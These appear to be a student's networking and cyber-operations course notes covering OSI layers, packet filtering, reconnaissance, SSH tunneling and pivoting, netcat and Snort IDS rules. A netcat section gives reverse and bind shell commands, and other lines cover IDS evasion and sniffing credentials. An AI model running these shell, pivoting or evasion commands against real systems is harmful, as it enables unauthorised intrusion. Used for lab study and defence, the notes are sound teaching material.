==================================== FUNDEMENTALS ====================================

bits
1     bit
4     nibble
8     byte
16    half word
32    word
64    long word

BASE (N) FORMATS
Common Formats

Base 2 - 01000010 01100001 01110011 01100101 00100000 00110010
Base 10 - 66 97 115 101 32 49 48
Base 16 - 42 61 73 65 20 31 36
Base 64 - QmFzZSA2NA==

can use tools for any conversion related needs like the programming mode calculator built into the workstation

Encapsulation and Decapsulation

Layer 4 - TCP Segment
Layer 3 - IP Packet
Layer 2 - Ethernet Frame
Layer 1 - Bits

PHYSICAL LAYER
OSI LAYER 1

RESPONSIBILITIES

Hardware Specifications
Encoding and Signaling
Data Transmission and Reception
Physical Network Design


DATA LINK LAYER
OSI LAYER 2

DATA LINK SUB-LAYERS

MAC (Media Access Control)
LLC (Logical Link Control)

ETHERNET HEADER
Dest. Mac = 6 bytes |
Src. Mac  = 6 bytes | - Mac Header/Trailer
Ethertype = 2 bytes |

Payload/Data/SDU = 46-1500 Bytes

CRC/FCS = 4 Bytes

802.1Q HEADER - adds a VLAN TAG between the Src. Mac and the Ethertype that is 4 bytes

ARP HEADER - downloaded image

Ethertypes
0x0800  IPv4
0x0806  ARP
0x86DD  IPv6
0x8100  VLAN TAG


NETWORK LAYER
OSI LAYER 3

IPv4, IPv6, and ICMP downloaded image

TTL values can show what OS a packet was generated from 64 being Linux, 128 being windows, and 255 being cisco routers

Fragmentation (IPv4) splits large amounts of data into multiple packets in order to send it all, turning on the fragmentation offset and and more fragments bit until the last packet which just has an offset

ZERO CONFIGURATION (what happens to something that isnt configured)
IPv4 Auto Configuration
* APIPA
* RFC 3927

IPv6 auto configuration
* SLAAC (StateLess Address Auto-configuration)
* RFC 4862

TRANSPORT LAYER
OSI LAYER 4

TCP and UDP header downloaded
(for tcp flags read like trying to read binary from left to right)

TCP uses 3-way handshake to establish connection sending a SYN receiving a SYN/ACK then responding with an ACK then tears down with two sets sent by both machines of FIN/ACK followed by ACK

SESSION LAYER
OSI LAYER 5

PROTOCOLS
SOCKS
NetBIOS
PPTP/L2TP
RPC

SOCKS 4/5 (TCP 1080)
Uses various Client / Server exchange messages
Client can provide authentication to server
Client can request connections from server

PPTP (TCP 1723)

L2TP (TCP 1701)

SMB/CIFS (TCP 139/445 AND UDP 137/138)
SMB Rides over Netbios
Netbios Dgram Service - UDP 138
Netbios Session Service - TCP 139
SAMBA and CIFS are just flavors of SMB

RPC (ANY PORT)
RPC is a request/response protocol.
User application will:
Sends a request for information to a external server
Receives the information from the external server
Display collected data to User

PRESENTATION LAYER
OSI LAYER 6

RESPONSIBILITIES
Translation
Formating
Encoding (ASCII, EBCDIC, HEX, BASE64)
Encryption (Symmetric or Asymmetric)
Compression

APPLICATION LAYER
OSI LAYER 7

FTP (TCP 20/21)
Messages:
FTP Commands
FTP Reply Codes
Modes:
Active (default)
Passive

FTP ACTIVE ISSUES
NAT and Firewall traversal issues
Complications with tunneling through SSH
Passive FTP solves issues related to Active mode and is most often used in modern systems

SSH (TCP 22)
Messages provide:
Client/server authentication
Asymmetric or PKI for key exchange
Symmetric for session
User authentication
Data stream channeling

SSH ARCHITECTURE 1
Server
Client
Session
Keys
User Key - Asymmetric public key used to identify the user to the server
Host Key - Asymmetric public key used to identify the server to the user
Session Key - Symmetric key created by the client

SSH ARCHITECTURE 2
Known-Hosts Database - collection of host keys that the client and server use for mutual authentication.
Agent - Stores keys as a convenience for users (prevents constant passphrase entry prompt)
Signer - signs the host-based authentication packets
Random Seed - used for entropy in creating pseudo-random numbers
Configuration File - settings that exist on the client and server to dictate configuration of ssh and sshd respectively

SSH IMPLEMENTATION CONCERNS
Using password authentication only
Key rotation
Key management
Implementation specification (libssh, sshtrangerthings)

TELNET (TCP 23)
Messages:
Telnet Commands
Telnet options

SMTP (TCP 25)
Messages:
SMTP Commands
SMTP Responses

TACACS (TCP 49) SIMPLE/EXTENDED (control logons)

HTTP(S) (TCP 80/443)
Messages:
Methods
GET / HEAD / POST / PUT
HTTP status Codes
100, 200, 300, 400

POP (TCP 110)
Messages:
POP Commands
POP Replies
POP Capabilities

IMAP (TCP 143)
Messages:
IMAP Commands
IMAP Status Response
IMAP Capabilities

RDP (TCP 3389)
Compression or Encryption support
Desktop size and color depth
Keyboard Mapping
Remote system control
Mouse-cursor color properties.

DNS (QUERY/RESPONSE) (TCP/UDP 53)

DHCP (UDP 67/68)

TFTP (UDP 69)
Messages:
TFTP Opcodes
TFTP Error Codes

NTP (UDP 123)

RADIUS (UDP 1645/1646 AND 1812/1813)

RTP (UDP ANY ABOVE 1023)

SNMP (UDP 161/162)
snmp
7 Message Types

Get Request
Set Request
Get Next
Get Bulk
Response
Trap
Inform

CAPTURE LIBRARY
What makes traffic capture possible?
Libpcap
WinPcap
NPCAP

WIRESHARK, TSHARK, TCPDUMP AND BPFS

BERKELEY PACKET FILTERS (BPF)
Requests a SOCK_RAW socket and setsockopt calls SO_ATTACH_FILTER
sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))
...
setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, ...)

BERKELEY PACKET FILTERS
Using BPFs with operators, bitmasking, and TCPDump creates a powerful tool for traffic filtering and parsing.

tcpdump {A} [B:C] {D} {E} {F} {G}

A = Protocol (ether | arp | ip | ip6 | icmp | tcp | udp)
B = Header Byte offset
C = optional: Byte Length. Can be 1, 2 or 4 (default 1)
D = optional: Bitwise mask (&)
E = Operator (= | == | > | < | <= | >= | != | () | << | >>)
F = Result of Expresion
G = optional: Logical Operator (&& ||) to bridge expressions
w = write to a given fileExample:
tcpdump 'ether[12:2] = 0x0800 && (tcp[2:2] != 22 && tcp[2:2] != 23)'

BITWISE MASKING
To filter down to the bit(s) and not just the byte.
ip[0] & 0x0F > 0x05

FILTER LOGIC - MOST EXCLUSIVE
All designated bit values must be set; no others can be set
tcp[13] = 0x11
--or--
tcp[13] & 0xFF = 0x11

FILTER LOGIC - LESS EXCLUSIVE
All designated bits must be set; all others may be see
tcp[13] & 0x11 = 0x11

FILTER LOGIC - LEAST EXCLUSIVE
At least one of the designated bits must be set to not equal 0; all others may be set
tcp[13] & 0x11 !=0

LAYER 2 SWITCHING TECHNOLOGIES

SWITCH OPERATION
Fast Forward - Only Destination MAC
Fragment Free - First 64 bytes
Store and Forward - Entire Frame and FCS

CAM TABLE
Learn - Examining the Source MAC Address
Forward - Examining the Destination MAC Address

VLANS AND IEEE 802.1Q

IEEE 802.1AD "Q-IN-Q"

SPANNING TREE PROTOCOL (STP)
Root decision process
1. Elect root Bridge
2. Identify the Root ports on non-root bridge
3. Identify the Designated port for each segment
4. Set alternate ports to blocking state

LAYER 2 DISCOVERY PROTOCOLS
Cisco Discovery Protocol (CDP)
Foundry Discovery Protocol (FDP)
Link Layer Discovery Protocol(LLDP)

DTP (DYNAMIC TRUNKING PROTOCOL)

VTP (VLAN TRUNKING PROTOCOL)

PORT SECURITY
Modes
shutdown
restrict
protect

LAYER 3 ROUTING TECHNOLOGIES

routers contain routing tables based off of networks that connect switches to each other

METRICS
Hop
Bandwidth
Delay
Load
MTU
Reliability
Cost
Policy

routing protocols are used to learn and advertise routeing tables while routed protocols are how user traffic is passed around

administrative distance defines the importance of data being passed to the router

================================= PROGRAMMING =======================================

PACKET CREATION AND SOCKET PROGRAMMING

SOCKET TYPES
Stream Sockets - Connection oriented and sequenced; methods for connection establishment and tear-down. Used with TCP, SCTP, and Bluetooth.
Datagram Sockets - Connectionless; designed for quickly sending and receiving data. Used with UDP.
Raw Sockets - Direct sending and receiving of IP packets without automatic protocol-specific formatting.

USER SPACE VS. KERNEL SPACE SOCKETS
User Space Sockets
Stream Sockets
Datagram Sockets
Kernel Space Sockets
Raw Sockets

SOCKET CREATION AND PRIVILEGE LEVEL
User Space Sockets - The most common sockets that do not require elevated privileges to perform actions on behalf of user applications.
Kernel Space Sockets - Attempts to access hardware directly on behalf of a user application to either prevent encapsulation/decapsulation or to create packets from scratch, which requires elevated privileges.

USER SPACE APPLICATIONS/SOCKETS
Using tcpdump or wireshark to read a file
Using nmap with no switches
Using netcat to connect to a listener
Using netcat to create a listener above the well known port range(1024+)
Using /dev/tcp or /dev/udp to transmit data

KERNEL SPACE APPLICATIONS/SOCKETS
Using tcpdump or wireshark to capture packets on the wire
Using nmap for OS identification or to set specific flags when scanning
Using netcat to create a listener in the well known port range (0 - 1023)
Using Scapy to craft or modify a packet for transmission

UNDERSTANDING PYTHON TERMINOLOGY
Libraries
Modules
Functions
Exceptions
Constants
Objects
Types

NETWORK PROGRAMMING WITH PYTHON3
Network sockets primarily use the Python3 Socket library and socket.socket function.
import socket
  s = socket.socket(socket.FAMILY, socket.TYPE, socket.PROTOCOL)

THE SOCKET.SOCKET FUNCTION
Inside the socket.socket. function, you have these arguments, in order:
socket.socket([*family*[,*type*[*proto*]]])
family constants should be: AF_INET (default), AF_INET6, AF_UNIX
type constants should be: SOCK_STREAM (default), SOCK_DGRAM, SOCK_RAW
proto constants should be: 0 (default), IPPROTO_RAW

RAW IPV4 SOCKETS
Raw Socket scripts must include the IP header and the next headers.
Requires guidance from the "Request for Comments" (RFC)to follow header structure properly.
RFCs contain technical and organizational documents about the Internet, including specifications and policy documents.
See RFC 791, Section 3 - Specification for details on how to construct an IPv4 header.

RAW SOCKET USE CASE
Testing specific defense mechanisms - such as triggering and IDS for an effect, or filtering
Avoiding defense mechanisms
Obfuscating data during transfer
Manually crafting a packet with the chosen data in header fields

ENCODING AND DECODING
Encoding
The process of taking bits and converting them using a specified cipher.

Decoding
Reverse of the conversion process used by the specified cipher for encoding.
Common encoding schemes
UTF-8, Base64, Hex

========================== NETWORK RECONAISSANCE ===============================================

RECONNAISSANCE
Active
Passive
Internal
External

PASSIVE RECONNAISSANCE
Gathering information about targets without direct interaction
Not as straight forward and requires more time than active reconnaissance
Lower risk of discovery

PASSIVE RECONNAISSANCE
Involves identifying:
IP addresses and Sub-Domains
External and 3rd party sites
People and Technologies
Content of Interest
Vulnerabilities

PASSIVE RECONNAISSANCE
Possible tools for gathering:
WHOIS queries
Job site listings
Phone Numbers
Google searches
Passive OS fingerprinting

PASSIVE EXTERNAL NETWORK RECONNAISSANCE
Information gathered outside of the network using passive methods
Allows for more efficient attacks and plans

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: DNS
Resolves hostnames to IP addresses
RFC 3912
WHOIS queries

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: DIG
Typically between primary and secondary DNS servers
If allowed to transfer externally hostnames, IPs, and IP blocks can be determined

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: ZONE TRANSFERS
Returns DNS information
Supplements base queries

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: HOST HISTORY
netcraft
wayback machine

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: GOOGLE SEARCHES
subdomains
technologies

PASSIVE EXTERNAL NETWORK RECONNAISSANCE: SHODAN
Reveals information about technologies, remote access services, improperly configured services, and network infrastructure.
When selected can give additional information and applicable vulnerabilities

NETWORK SCANNING
Scanning Strategy
Remote to Local
Local to Remote
Local to Local
Remote to Remote

NETWORK SCANNING
Scanning Approach
Aim
Wide range target scan
Target specific scan
Method
Single source scan
Distributed scan

NETWORK SCANNING
Broadcast Ping and Ping sweep
ARP scan
SYN scan
Full connect scan
Null scan
FIN scan
XMAS tree scan
UDP scan

NETWORK SCANNING
ACK/Window scan
RPC scan
FTP scan
decoy scan
OS fingerprinting scan
version scan
Protocol ping
Discovery probes

NETWORK SCANNING - CODE
Example Syntax
nmap [Options] [Target IP/ Subnet]
nc [Options] [Target IP] [Target Port]

============================= NETWORK MAPPING ==========================================

ARP is not reliable to use for enumerating networks but ip a can be used to find other arp info on boxes you ssh into
ssh into the router and view the config to begin enumeration
once in the router use show int and show config to view interfaces and router configs
use nmap <target ip> -Pn -p 21-25,80 to look at important ports for this class (can use -T5 to make it go faster if need be)
can use anonymous ftp login to look at files on a box with that port open (doesnt always work)
wget can be used when the http port is open like wget -r(grabs every file and putsit in a new directory on your machine) <target ip> which can be switched to ftp by doing wget ftp://<target ip> or <target ip>:<target port>(21 in this case)
can use screenshot tool to crop out screenshots and paste them to your draw.io
ssh can be used if you can get the credentials to get on the box for easy enumeration
netcat can be used to banner grab with nc <target port> <ports to check> to look for sneaky hidden ports (basically they give ports fake names)
even if you dont have all the details write down the information you do know for hosts
can ssh to other ports using ssh <user>@<target ip> -p <port>
once on a machine try to find out everything you can about said box like using the find command or hostname
scp can be used to grab files from boxes and take them to your system by
if the telnet banner is grabbed and shows weid symbols test out telnet to see if it works with telnet <target ip>
if you banner grab an http on port 80 or whatever and it just sits there use the GET command to see if it responds with http info
read pngs or jpgs using eom or eog
./scan.sh can be used to do a netcat scan of a buncha ports
ss -ntlp can be used to view open ports on a box
dig <record type> @<dns server> <optional zonetransfer.me if needed for zone transfer info>
use nmap <ip range> -Pn to ping sweep a networks range
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done cli-ninja-ping-sweep
ip n shows the directly connected neighbors to a device

============================== DATA TRANSFER, MOVEMENT, and REDIRECTION ==================================

DESCRIBE COMMON METHODS FOR TRANSFERRING DATA
TFTP
FTP
Active
Passive
SFTP
SCP

TFTP
Trivial File Transfer Protocol
RFC 1350 Rev2
UDP transport
Extremely small and very simple communication
No terminal communication ()
Insecure (no authentication or encryption)
No directory services
Used often for technologies such as BOOTP and PXE

FTP
File Transfer Protocol
RFC 959
TCP transport
Uses multiple TCP connections
Control Connection (21) / Data Connection (20)
Authentication through clear-text sign in (username and password)
Insecure in default configuration
Has directory services

SFTP
Secure File Transfer Protocol
TCP transport (TCP port 22)
Uses symmetric and asymmetric encryption
Adds FTP like services to SSH
Authentication through sign in (username and password) or with SSH key
Interactive terminal access

FTPS
File Transfer Protocol Secure
TCP transport (TCP port 443)
Adds SSL/TLS encryption to FTP
Authentication with username/password and/or PKI
Interactive terminal access

SCP
Secure Copy Protocol
TCP Transport (TCP port 22)
Uses symmetric and asymmetric encryption
Authentication through sign in (username and password) or with SSH key
Non Interactive can use -r to copy whole diretories

SCP SYNTAX
Download a file from a remote directory to a local directory
$ scp student@172.16.82.106:secretstuff.txt /home/student
Upload a file to a remote directory from a local directory
$ scp secretstuff.txt student@172.16.82.106:/home/student
Copy a file from a remote host to a separate remote host
$ scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student

SCP SYNTAX W/ ALTERNATE SSHD
Download a file from a remote directory to a local directory
$ scp -P 1111 student@172.16.82.106:secretstuff.txt /home/student
Upload a file to a remote directory from a local directory
$ scp -P 1111 secretstuff.txt student@172.16.82.106:/home/student

SCP SYNTAX THROUGH A TUNNEL
ssh student@172.16.82.106 -L 1111:localhost:22 -NT
Download a file from a remote directory to a local directory
$ scp -P 1111 student@localhost:secretstuff.txt /home/student
Upload a file to a remote directory from a local directory
$ scp -P 1111 secretstuff.txt student@localhost:/home/student

------------------------------------ TRAFFIC REDIRECTION USING TOOLS ----------------------------------------

NETCAT
NETCAT is the "swiss army knife" networking utility which reads and writes data across network socket connections using the TCP/IP protocol. It is designed to be a reliable "back end" tool that can be used directly or easily driven by other programs and scripts.
Can be used for the following:
inbound and outbound connections, TCP/UDP, to or from any ports
troubleshooting network connections
sending/receiving data (insecurely)TION USING TOOLS

NETCAT: CLIENT TO LISTENER FILE TRANSFER
Client (sends file): nc 10.2.0.2 9001 < file.txt
Listener (receive file): nc -l -p 9001 > newfile.txt

NETCAT: LISTENER TO CLIENT FILE TRANSFER
Listener (sends file): nc -l -p 9001 < file.txt
Client (receive file): nc 10.2.0.2 9001 > newfile.txt

==NETCAT RELAY DEMOS==
On Client Relay:

mknod mypipe p
nc 10.1.0.2 9002 0< mypipe | nc 10.2.0.2 9001 1> mypipe
On Listener2 (sends info):

nc -l -p 9002 < infile.txt
On Listener1 (receives info):

nc -l -p 9001 > outfile.txt
==Writes the output to listener1 and listener2 through the named pipe==

Another example
nc -lp 1234 > 1steg.jpg (receive a file being sent over port 1234 on a relay)
nc -lp 6969 > 2steg.jpg (send the end receiving box to listen on port for previosuly mentioned file)
nc 10.50.35.85 6969 < 1steg.jpg (send the file once the listening port is set up)

DESCRIBE COMMON METHODS FOR TRANSFERRING DATA
TFTP
FTP
Active
Passive
SFTP
SCP

REVERSE SHELL USING NETCAT
When shelled into the remote host using -c :
nc -c /bin/sh <your ip> <any unfiltered port>
You could even pipe BASH through NETCAT.
/bin/sh | nc <your ip> <any unfiltered port>
Then listen for the shell.
nc -l -p <same unfiltered port> -vvv
You can also listen using the -e with NETCAT.
nc -l -p <any unfiltered port> -e /bin/bash

----------------------- NETWORK TUNNELING ------------------------

SSH
Various Implementations (v1 and v2)
Provides authentication, encryption, and integrity.
Allows remote terminal sessions
Used for tunneling
Created as a secure replacement for Berkeley Remote commands:
rsh - replaced with ssh, provides a channel for running a shell on a remote computer.
rlogin - replaced with rlogin, provides remote login capability.
rcp - replaced with scp for secure file transfer
sftp (not a unix r command replacement) - creates remote directory listing and file transfer capability over SSH

SSH PORT FORWARDING
Creates channels using SSH-CONN protocol
Allows for tunneling of other services through SSH
Provides insecure services encryption

SSH LOCAL PORT FORWARDING
Syntax
ssh -p <optional alt port> <user>@<pivot ip> -L <local bind port>:<tgt ip>:<tgt port> -NT
or
ssh -L <local bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<pivot ip> -NT

SSH LOCAL PORT FORWARDING
Creates a local port (1111) on the local host that forwards to a target machine’s port 80.
ssh student@172.16.82.106 -L 1111:localhost:80 -NT (localhost = 172.16.82.106 in this scenario because it comes after the ssh)
or
ssh -L 1111:localhost:80 student@172.16.82.106 -NT (localhost is where you are after whatever happened before it, so unless a tunnel is specified before localhost is called you ssh to yourself which can be used to access port bindings to other systems on different ports)

SSH LOCAL PORT FORWARDING THROUGH A LOCAL PORT
Internet Host:
ssh student@172.16.1.15 -L 1111:172.16.40.10:22 -NT
ssh student@localhost -p 1111 -L 2222:172.16.82.106:80 -NT
firefox localhost:2222
Creates an additional local port on the local host that forwards to a target machine through the previous channel created.

local port forwarding example
ssh student@<Relay IP> -L 1111:<Target IP>:22 -NT to establish tunnel
then on your machine do ssh localhost -p 1111 to access your created tunnel
can do ssh localhost -p 1111 -D 9050 (the -D is dynamic port forwarding and allows the use of proxychains)(not using -NT gives you an active session on the box)
can check for port using ss -ntlp to make sure its working

SSH DYNAMIC PORT FORWARDING
Syntax
ssh -D <port> -p <alt port> <user>@<pivot ip> -NT
Proxychains default port is 9050
Creates a dynamic socks4 proxy that interacts alone, or with a previously established remote or local port forward.
Allows the use of scripts and other userspace programs through the tunnel (proxychains can only run tcp protocols once it is called in the terminal not alloowing udp protocols like ping)
when running proxychains you have to run it on your system, not on the connected tunnel (use localhost to reference to reference the connected ip)
with nmap for example you have to use proxychains nmap -Pn 127.0.0.1 since you cant use ping since its UDP
can only have one proxychains running at a time
DO NOT PIVOT THROUGH PROXYCHAINS

SSH DYNAMIC PORT FORWARDING 1-STEP
Blue Private Host-1:
ssh student@172.16.82.106 -D 9050 -NT
proxychains ./scan.sh
proxychains ssh student@10.10.0.40

SSH DYNAMIC PORT FORWARDING 2-STEP
Blue Private Host-1:
ssh student@172.16.82.106 -L 1111:10.10.0.40:22 -NT
ssh student@localhost -D 9050 -p 1111 -NT
proxychains curl ftp://www.onlineftp.ch
proxychains wget -r www.espn.com
proxychains ./scan.sh
proxychains ssh student@172.16.101.2

SSH REMOTE PORT FORWARDING
Syntax
ssh -p <optional alt port> <user>@<remote ip> -R <remote bind port>:<tgt ip>:<tgt port> -NT
or
ssh -R <remote bind port>:<tgt ip>:<tgt port> -p <alt port> <user>@<remote ip> -NT

SSH REMOTE PORT FORWARDING
Blue Host-1
ssh student@10.10.0.40 -R 1111:localhost:80 -NT
Creates a remote port on the remote’s local host that forwards to the target specified.

SSH REMOTE AND LOCAL PORT FORWARDING
Blue Private Host-1:
ssh student@172.16.82.106 -R 1111:localhost:22 -NT
Internet Host:
ssh student@172.16.82.106 -L 2222:localhost:1111 -NT
Internet Host:
ssh localhost -p 2222
Creates a remote port on a remote machine, staging a connection.
Also creates a local port on the localhost to connect to the previously staged connection.
Login to extra1 via the net1 local port forward

COVERT CHANNEL
A Covert Channel is a method of creating a capability to transfer information objects between endpoints that should not be allowed based on policy.
Strategies attackers use to avoid detection:
Tunnels
ICMP
DNS
HTTP

======================== GUNNY LECTURE ON TUNNELING ===================================

Reference Another_CTFD.mAp.drawio

Recon Methodology
1. Host Discovery (nmap, netcat, ./scan.sh, ping sweep)
nmap -sn -T4 <ip range>(.13,14,15 or .25/27) -p <ports> | egrep -i "scan report|open"  
2. Port/Service Discovery(nmap, netcat, ./scan.sh)
3. Port Validate (aka Banner Grabbing (nc))
4. Follow-on actions based on ports found
4a. if its 22 or 23, connect to it and do Passive Recon
4b. if its 21 or 80, wget -r <ip> or wget -r ftp://<ip> (pull files)

Scanning Methodology
1. Quick scan ports: 21-23, 80
2. Scan specific ports based on hints/clues found 
3. Well known ports: 0-1023
4. Scan 1-10000
5. 65336

Passive Recon Methodology
hostname
ip a, ifconfig (interfaces and subnets)
 arp -a, ip neigh neighbors (ip neigh | egrep -iv 'failed')
ss -ntlp (other listening ports, maybe filtered?)
ls /usr/cctc/share (File of interest)
which tcpdump wireshark nmap telnet wget curl etc. Available tools
use telnet and tcpdump to sniff out the creds on a new system

Ping Sweep 
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done

================================ NETWORK ANALYSIS =============================================

FINGERPRINTING AND HOST IDENTIFICATION
Variances in the RFC implementation for different OS’s and systems enables the capability for fingerprinting
Tools used for fingerprinting and host identification can be used passively(sniffing/fingerprinting) or actively(scanning)

P0F (PASSIVE OS FINGERPRINTING)
Looks at variations in initial TTL, fragmentation flag, default IP header packet length, window size, and TCP options
Configuration stored in:
 /etc/p0f/p0f.fp

NETWORK TRAFFIC SNIFFING
What makes traffic capture possible?
Libpcap
WinPcap (outdated)
NPCAP

NETWORK TRAFFIC BASELINING
Snapshot of what the network looks like during a time frame
No industry standard
7 days to establish the initial snapshot
Prerequisite Information

NETWORK BASELINE OBJECTIVE
Determines the current state of your network
Ascertain the current utilization of network resources
Identify normal vs peak network traffic time frames
Verify port / protocol usage

ANALYZE NETWORK TRAFFIC STATISTICS
Protocol Hierarchy
Conversations
Endpoints
I/O Graph
IPv4 and IPv6 Statistics
Expert Information

NETWORK DATA TYPES
Full Packet Capture Data
Session Data
sflow
NetFlow
Statistical Data
Packet String Data
Alert Data
Log Data

DATA COLLECTION DEVICES
Sensors
In-Line
Passive

METHODS OF DATA COLLECTION
TAP
SPAN
ARP Spoofing (MitM)

ANOMALY DETECTION
Indicator of Attack (IOA)
Proactive
A series of actions that are suspicious together
Focus on Intent
Looks for what must happen
Code execution. persistence, lateral movement, etc.

ANOMALY DETECTION
Indicator of Compromise (IOC)
Reactive
Forensic Evidence
Provides Information that can change
Malware, IP addresses, exploits, signatures

INDICATORS
.exe/executable files
NOP sled
Repeated Letters
Well Known Signatures
Mismatched Protocols
Unusual traffic
Large amounts of traffic/ unusual times

POTENTIAL INDICATORS OF ATTACK
Destinations
Ports
Public Servers/DMZs
Off-Hours
Network Scans
Alarm Events
Malware Reinfection

POTENTIAL INDICATORS OF COMPROMISE
Unusual traffic outbound
Anomalous user login or account use
Size of responses for HTML
High number of requests for the same files
Using non-standard ports/ application-port mismatch
Writing changes to the registry/system files

TYPES OF MALWARE
Adware/Spyware
large amounts of traffic/ unusual traffic
IOA
Destinations
IOC
Unusual traffic outbound
Virus
phishing/ watering hole
IOA
Alarm Events, Email protocols
IOC
changes to the registry/ system files

TYPES OF MALWARE 2
Worm
phishing/ watering hole
IOA
Alarm events
IOC
changes to registry/ system files
Trojan
beaconing
IOA
Destinations
IOC
Unusual traffic outbound, unusual tasks, changes to registry/ system files

TYPES OF MALWARE 3
Rootkit
IOA
Malware reinfection
IOC
Anomalous user login/ account use
Backdoor
IOA
Remote logins
IOC
Anomalous user login/ account use

TYPES OF MALWARE 4
Botnets
large amounts of IPs
IOA
Destinations, remote logins
IOC
Unusual tasks, anomalous user login/ account use
Polymorphic and Metamorphic Malware
Depends on the malware type/class

TYPES OF MALWARE 5
Ransomware
IOA
Destinations, Ports, Malware reinfection
IOC
Unusual traffic outbound, non-standard ports, unusual tasks
Mobile Code
IOA
Depends on the malware type/class

TYPES OF MALWARE 6
Information-Stealing Worms
phishing/ watering hole, large amounts of traffic/ unusual traffic
IOA
Alarm events, Destinations
IOC
changes to registry/ system files, Unusual traffic outbound
BIOS/ Firmware Malware
IOA
Malware reinfection
IO
Depends on the malware type/class

POTENTIAL METHODS OF DETECTION FOR IOAS AND IOCS
Display Filters
Follow Streams
BPFs
Color Coding
Hex Outputs

DECODING
enca
chardet
iconv

=========================== INTRUSION DETECTION & PREVENTION SYSTEMS ===============================

Placement
In line
or not

Recognition Methods
Signature
Heuristic aka Behavioral

SNORT IDS/IPS RULE - HEADER
[action] [protocol] [s.ip] [s.port] [direction] [d.ip] [d.port] ( match conditions ;)
Action - such as alert, log, pass, drop, reject
Protocol - includes TCP, UDP, ICMP and others
Source IP address - single address, CIDR notation, range, or any
Source Port - one, multiple, any, or range of ports
Direction - either inbound or in and outbound
Destination IP address - options mirror Source IP
Destination port - options mirror Source port

SNORT IDS/IPS GENERAL RULE OPTIONS:
msg - specifies the human-readable alert message
reference - links to external source of the rule
sid - used to uniquely identify Snort rules
rev - uniquely identify revisions of Snort rules
Classtype - used to describe what a successful attack would do
priority - level of concern (1 - really bad, 2 - badish, 3 - informational)
metadata - allows a rule writer to embed additional information about the rule

SNORT IDS/IPS PAYLOAD DETECTION OPTIONS:
content - looks for a string of text.
|binary data| - to look for a string of binary HEX
nocase - modified content, makes it case insensitive
depth - specify how many bytes into a packet Snort should search for the specified pattern
distance - how far into a packet Snort should ignore before starting to search for the specified pattern relative to the end of the previous pattern match
within - modifier that makes sure that at most N bytes are between pattern matches using the content keyword
offset - skips a certain number of bytes before searching (i.e. offset: 12)

SNORT IDS/IPS NON-PAYLOAD DETECTION OPTIONS:
Flow - direction (to/from client and server) and state of connection (established, stateless, stream/no stream)
ttl - The ttl keyword is used to check the IP time-to-live value.
tos - The tos keyword is used to check the IP TOS field for a specific value.
ipopts - The ipopts keyword is used to check if a specific IP option is present
seq - check for a specific TCP sequence number
ack - check for a specific TCP acknowledge number.
flags - The flags keyword is used to check if specific TCP flag bits are present.
itype - The itype keyword is used to check for a specific ICMP type value.
icode - The icode keyword is used to check for a specific ICMP code value.

SNORT IDS/IPS POST DETECTION OPTIONS:
logto - The logto keyword tells Snort to log all packets that trigger this rule to a special output log file.
session - The session keyword is built to extract user data from TCP Sessions.
react - This keyword implements an ability for users to react to traffic that matches a Snort rule by closing connection and sending a notice.
tag - The tag keyword allow rules to log more than just the single packet that triggered the rule.
activates - This keyword allows the rule writer to specify a rule to add when a specific network event occurs.
activated_by - This keyword allows the rule writer to dynamically enable a rule when a specific activate rule is triggered.
count - Allows the rule writer to specify how many packets to leave the rule enabled for after it is activated.

SNORT IDS/IPS THRESHOLDING AND SUPPRESSION OPTIONS:
type [limit | threshold | both]
limit alerts on the 1st event during defined period then ignores the rest.
Threshold alerts every [x] times during defined period.
Both alerts once per time internal after seeing [x] amount of occurrences of event. It then ignores all other events during period.
track [by_src | by_dst] - rate is tracked either by source IP address, or destination IP address
count [#] - number of rule matching in [s] seconds that will cause event_filter limit to be exceeded
seconds [seconds] - time period over which count is accrued. [s] must be nonzero value

SNORT RULE EXAMPLE ----------------------------
Look for anonymous ftp traffic:

alert tcp any any -> any 21 (msg:"Anonymous FTP Login"; content: "anonymous"; sid:2121; )
This will cause the pattern matcher to start looking at byte 6 in the payload)

alert tcp any any -> any 21 (msg:"Anonymous FTP Login"; content: "anonymous"; offset:5; sid:2121; )
This will search the first 14 bytes of the packet looking for the word “anonymous”.

alert tcp any any -> any 21 (msg:"Anonymous FTP Login"; content: "anonymous"; depth:14; sid:2121; )
Deactivates the case sensitivity of a text search.

alert tcp any any -> any 21 (msg:"Anonymous FTP Login"; content: "anonymous"; nocase; sid:2121; )

RULE HEADER ----------------------
ICMP ping sweep

alert icmp any any -> 10.1.0.2 any (msg: "NMAP ping sweep Scan"; dsize:0; sid:10000004; rev: 1; )

Look for a specific set of Hex bits (NoOP sled)
alert tcp any any -> any any (msg:"NoOp sled"; content: "|9090 9090 9090|"; sid:9090; rev: 1; )

Incorrect telnet login attempt
alert tcp any 23 -> any any (msg:"TELNET login incorrect"; content:"Login incorrect";
flow:established,from_server; classtype:bad-unknown; sid:2323; rev:6; )
-------------------------------------
FAILED IDS/IPS
Fail open
Fail close

ATTACKING & EVADING IDS/IPS
Based on Delta between devices
Insertion Attack
IDS accepts packet

Host will not accept packet
Evasion Attacking
IDS does not accept packet
Host will accept packet

TECHNICAL ATTACKS ON IDS/IPS
packet sequence manipulation
fragmenting payload
overlapping fragments with different reassembly by devices
Manipulating TCP headers
Manipulating IP options
Sending data during the TCP connection setup

NON-TECHNICAL ATTACKS AGAINST IDS/IPS

attacking during periods of low manning
Example - Ramadan 2012 Saudi Aramco attack

attacking during a surge in activity
Example - Target Corp. Point of Sale machines during the Thanksgiving-Christmas 2013 shopping season

STRENGTHENING DEFENSIVE SYSTEMS
Linking IDS/IPS to other tools
Multiconfig
Tuning
HIDS and File Integrity

Snort must have a conf file at /etc/snort which has to reference a set of rules in the rules directory

run Snort as a daemon using sudo snort -D -l /var/log/snort -c /etc/snort/snort.conf (must see a prompt to know it was started) when viewing the task you can see the command that was run to show conf and log files
once snort is started check your set log file to see any alerts that are triggered (alert is a brief synopsis while the snort.log.{numbers} is the pcap with said rules that were triggered)

